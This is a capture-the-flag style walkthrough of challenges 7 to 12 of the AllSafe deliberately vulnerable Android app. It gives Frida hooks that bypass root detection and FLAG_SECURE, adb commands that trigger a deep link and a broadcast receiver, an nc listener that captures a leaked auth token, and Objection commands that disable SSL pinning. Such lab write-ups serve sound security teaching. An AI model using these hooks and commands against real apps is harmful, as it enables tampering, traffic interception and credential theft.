---
slug: allsafe-part2
title: AllSafe - Part 2
authors: [wesam]
date: 2026-05-01
---

AllSafe Part 2 covers challenges 7–12: Root Detection, Secure Flag Bypass, Deep Link, Insecure Broadcast Receiver, and Vulnerable WebView.

{/* truncate */}

## 7. Root Detection

### Objective

![image.png](/img/image10.png)

### Solution

- Reviewing challenge Code in JADX and this is our entry point
    
```java
    if (new RootBeer(this$0.getContext()).isRooted()) {
        // "Sorry, your device is rooted!"
    }
```
    
    - The app creates a **new instance** of `RootBeer` and immediately calls `isRooted()` — this is the only thing standing between us and success.
- Inside `isRooted()`  : All 9 checks are connected with `||` (OR) — meaning if **even one** returns `true`, `isRooted()` returns `true` and the app blocks us.
    
```java
    public boolean isRooted() {
        return detectRootManagementApps()       // SuperSU, Magisk Manager installed?
            || detectPotentiallyDangerousApps() // known dangerous apps installed?
            || checkForBinary(Const.BINARY_SU)  // su binary exists on device?
            || checkForDangerousProps()         // build.prop has test/debug values?
            || checkForRWPaths()                // system partitions mounted as rw?
            || detectTestKeys()                 // build signed with test keys?
            || checkSuExists()                  // runs `which su` in shell
            || checkForRootNative()             // native JNI level root check
            || checkForMagiskBinary();          // magisk binary exists on device?
    }
```
    
- We don't care about those checks we only have to hook on `isRooted` and force its return value to be false
    
```javascript
    Java.perform(function() {
        var RootBeer = Java.use("com.scottyab.rootbeer.RootBeer");
    
        RootBeer.isRooted.implementation = function() {
            console.log("[*] isRooted() hooked → returning false");
            return false;  // device appears clean to the app
        };
    });
```

<div style={{borderTop: '3px solid #25c2a0', margin: '40px 0'}} />

## 8. Secure Flag Bypass

### Objective

![image.png](/img/image11.png)

- **`FLAG_SECURE`** is a Windows flag set by the app on its `MainActivity`
    
```java
    getWindow().setFlags(
        WindowManager.LayoutParams.FLAG_SECURE,
        WindowManager.LayoutParams.FLAG_SECURE
    );
```
    
    This prevents:
    
    - Taking screenshots
    - Screen recording
    - Appearing in the recent apps preview
- It is **not a vulnerability,** it's a privacy protection feature. The challenge is just using it as a Frida practice target.

---

### Bypass with Frida

```javascript
Java.perform(function() {
    var Window = Java.use("android.view.Window");

    Window.setFlags.implementation = function(flags, mask) {
        // remove FLAG_SECURE (value = 8192) before it gets set
        flags = flags & ~8192;
        mask  = mask  & ~8192;
        this.setFlags(flags, mask);
        console.log("[*] FLAG_SECURE removed");
    };
});
```

- Or use the codeshare directly:

`frida --codeshare eiliyakeshtkar0/screenshot-protection -f com.example.allsafe`

<div style={{borderTop: '3px solid #25c2a0', margin: '40px 0'}} />

## 9. Deep Link

### Objective:

![image.png](/img/image12.png)

### Solution:

- The app contains a hidden activity that can only be unlocked via a specific Deep Link. The goal is to find the correct URI and the required secret key.
- Search the **AndroidManifest.xml** for keywords like `data`, `browsable`, or `android.intent.action.VIEW`. This reveals the Deep Link configuration:
    
    ![image.png](/img/image13.png)
    
- Browsing the `DeepLinkTask` class reveals the validation logic:

```java
Intent intent = getIntent();
Uri data = intent.getData();

// Extracts the "key" parameter from the URI
if (data.getQueryParameter("key").equals(getString(R.string.key))) {
    // Successfully unlocks the challenge
    SnackUtil.INSTANCE.simpleMessage(this, "Good job, you did it!");
}
```

- By checking  **`strings.xml`** the key is: `ebfb7ff0-b2f6-41c8-bef3-4fba17be410c`
    
    ![image.png](/img/image14.png)
    
- **The data format for a Deep Link is `scheme://host:port/path?query` Combining the manifest data and the discovered key, we can construct the exploit URI: `allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c`**
- Now we can trigger deep link via ADB
    
```bash
    adb shell am start \
      -n infosecadventures.allsafe/.challenges.DeepLinkTask \
      -a android.intent.action.VIEW \
      -d "allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c"
```
    
- Solved

![image.png](/img/image15.png)

<div style={{borderTop: '3px solid #25c2a0', margin: '40px 0'}} />

## 10. Insecure Broadcast Receiver

### Objective

![image.png](/img/image16.png)

### Steps

**Receiver Type**

- **Static** → defined in `AndroidManifest.xml`
- **Dynamic Receivers** → function `registerReceiver`

---

- in this challenge there is a receiver defined in manifest
    
    ![image.png](/img/image17.png)
    
    - `exported="true"` + no `android:permission` → **anyone can trigger it**
    - Action: `infosecadventures.allsafe.action.PROCESS_NOTE`
- reviewing the **`NoteReceibver`** code , this code takes 3 extras
    
```java
    public class NoteReceiver extends BroadcastReceiver {
        @Override // android.content.BroadcastReceiver
        public void onReceive(Context context, Intent intent) {
            String server = intent.getStringExtra("server");
            String note = intent.getStringExtra("note");
            String notification_message = intent.getStringExtra("notification_message");
            OkHttpClient okHttpClient = new OkHttpClient.Builder().build();
            HttpUrl httpUrl = new HttpUrl.Builder().scheme("http").host(server).addPathSegment("api").addPathSegment("v1").addPathSegment("note").addPathSegment("add").addQueryParameter("auth_token", "YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4=").addQueryParameter("note", note).build();
            Log.d("ALLSAFE", httpUrl.getUrl());
            Request request = new Request.Builder().url(httpUrl).build();
```
    
    - `server` Used as Host in the HTTP URL → **attacker controlled**
    - `note` Used as query parameter
    - `notification_message`  Received but unused
- Then uses those extras to send Https request the resulting URL  `**http://<server>/api/v1/note/add?auth_token=YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4=&note=<note>**`
- The Problem here there is Unvalidated `server` extra so attacker sends a broadcast to a server under his control, the app makes HTTP request to this server —> Auth token leaks in URL.

---

<aside>
💡

**Permission re-delegation** is a security vulnerability in which a malicious application exploits another application that has higher privileges to perform actions or access data that it would not normally be allowed to access.

</aside>

**in this example** 

![image.png](/img/image18.png)

---

- We can exploit this with adb
    
```bash
    adb shell am broadcast \
      -a infosecadventures.allsafe.action.PROCESS_NOTE \
      -n infosecadventures.allsafe/.challenges.NoteReceiver \
      --es server "10.0.2.2" \
      --es note "hacked" \
      --es notification_message "x"
```
    
- The attacker start a listener on his machine **`nc -lvnp 80` , will receive something like this `GET /api/v1/note/add?auth_token=YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4=&note=hacked` ,**
- **just decode it `echo "YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4=" | base64 -d`  —> allsafe_dev_admin_token**

<div style={{borderTop: '3px solid #25c2a0', margin: '40px 0'}} />

## 11. Vulnerable Webview

### Objective

![image.png](/img/image21.png)

- Reviewing code reveals
    
    ![image.png](/img/image22.png)
    
- Because of **`setJavaScripptEnabled`**
    
    ![image.png](/img/image23.png)
    
- Because of **`setAllowFileAccess`**: it supports File schema we can review internal files like **`/etc/hosts`**
    
    ![image.png](/img/image24.png)

<div style={{borderTop: '3px solid #25c2a0', margin: '40px 0'}} />

## 12. Certificate Pinning

![image.png](/img/image25.png)

<aside>
💡

SSL pinning (certificate pinning) forces an app to trust **only specific certificates or public keys** instead of any certificate signed by a trusted CA. Even if an attacker installs a custom CA (like Burp Suite's), the app rejects the TLS handshake — because the cert doesn't match the hardcoded pin.

</aside>

Used Objection to bypass SSL Pinning 

```bash
objection -n infosecadventures.allsafe start
android sslpinning disable
```

![image.png](/img/image26.png)